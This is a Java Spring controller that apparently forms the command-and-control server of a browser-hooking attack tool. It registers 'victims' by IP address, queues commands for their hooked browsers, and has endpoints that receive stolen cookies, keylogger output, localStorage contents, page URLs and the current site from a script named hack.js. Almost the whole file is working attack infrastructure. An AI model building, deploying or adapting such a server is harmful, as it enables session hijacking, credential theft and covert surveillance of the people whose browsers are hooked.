package nl.byron.hacking.controller;

import nl.byron.hacking.model.ShellCommand;
import nl.byron.hacking.model.TunnelCommand;
import nl.byron.hacking.model.Victim;
import org.joda.time.DateTime;
import org.joda.time.LocalDateTime;
import org.joda.time.format.DateTimeFormat;
import org.joda.time.format.DateTimeFormatter;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.ResponseStatus;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import javax.servlet.http.HttpServletRequest;

/**
 * @author Byron Voorbach
 */
@Controller
public class TunnelController {

    private static final Logger logger = LoggerFactory.getLogger(TunnelController.class);

    @Autowired
    private ShellController shellController;

    private static final DateTimeFormatter fmt = DateTimeFormat.forPattern("HH:mm:ss");

    Map<String, Victim> victims = new HashMap<>();

    /////RECEIVE/////

    @RequestMapping(value = "/receiveUrl/{generatedId}", method = RequestMethod.POST)
    @ResponseStatus(HttpStatus.OK)
    public void receivedUrl(@PathVariable String generatedId, @RequestBody String url) {
        ShellCommand shellCommand = new ShellCommand(generatedId,
                                                     new LocalDateTime().toString(fmt),
                                                     "getUrl",
                                                     "Received from host: " + url);
        shellController.reportBack(shellCommand);
    }

    @RequestMapping(value = "/receiveCookies/{generatedId}", method = RequestMethod.POST)
    @ResponseStatus(HttpStatus.OK)
    public void receivedCookies(@PathVariable String generatedId, @RequestBody String cookies) {
        ShellCommand shellCommand = new ShellCommand(generatedId,
                                                     new LocalDateTime().toString(fmt),
                                                     "getCookies",
                                                     "Received from host: " + cookies);
        shellController.reportBack(shellCommand);
    }

    @RequestMapping(value = "/receiveKeys/{generatedId}", method = RequestMethod.POST)
    @ResponseStatus(HttpStatus.OK)
    public void receivedKeys(@PathVariable String generatedId, @RequestBody String keys) {
        keys = keys.replace("undefined", "");
        ShellCommand shellCommand = new ShellCommand(generatedId,
                                                     new LocalDateTime().toString(fmt),
                                                     "stopLogger",
                                                     "Received from host: " + keys);
        shellController.reportBack(shellCommand);
    }

    @RequestMapping(value = "/receiveLocaleStorage/{generatedId}", method = RequestMethod.POST)
    @ResponseStatus(HttpStatus.OK)
    public void receiveLocaleStorage(@PathVariable String generatedId, @RequestBody String localeStorageContent)
            throws UnsupportedEncodingException {
        localeStorageContent = URLDecoder.decode(localeStorageContent, "UTF-8");
        localeStorageContent = localeStorageContent.replace("&data[]=", " -*- ");

        ShellCommand shellCommand = new ShellCommand(generatedId,
                                                     new LocalDateTime().toString(fmt),
                                                     "getLocalStorage",
                                                     "Received from host: " + localeStorageContent);
        shellController.reportBack(shellCommand);
    }

    @RequestMapping(value = "/receiveSite/{generatedId}", method = RequestMethod.POST)
    @ResponseStatus(HttpStatus.OK)
    public void receivedSite(@PathVariable String generatedId, @RequestBody String site) {
        Victim victim = victims.get(generatedId);
        if (victim != null) {
            site = site.replace("hack.js", "");
            victim.setCurrentPage(site);
        }
    }

    /////SEND/////

    /*
        NTP = nothing to process
     */
    @RequestMapping(value = "/ping/{generatedId}", method = RequestMethod.GET)
    @ResponseBody
    public Object handlePing(@PathVariable String generatedId, HttpServletRequest request) {
        Victim victim = victims.get(generatedId);
        if (victim == null) {
            logger.warn("Receieved new victim with ip: " + request.getRemoteAddr());
            victim = new Victim(generatedId, request, new DateTime());
            victims.put(generatedId, victim);
        } else {
            victim.setLastSeen(new DateTime());
            TunnelCommand tunnelCommand = victim.getCommand();
            if (tunnelCommand != null) {
                return tunnelCommand;
            }
        }

        return "ntp";
    }

    // ==================================================== Helpers ====================================================

    public void addCommandToBeProcessed(String id, TunnelCommand command) {
        Victim victim = victims.get(id);

        if (victim != null) {
            ArrayList<TunnelCommand> commandsToBeSent = victim.getCommandsToBeSent();
            commandsToBeSent.add(command);
        }
    }

    public Map<String, Victim> getVictims() {
        return victims;
    }

    public Victim getVictim(String generatedId) {
        return victims.get(generatedId);
    }

    public void removeVictim(Victim victim) {
        victims.remove(victim.getId());
    }
}
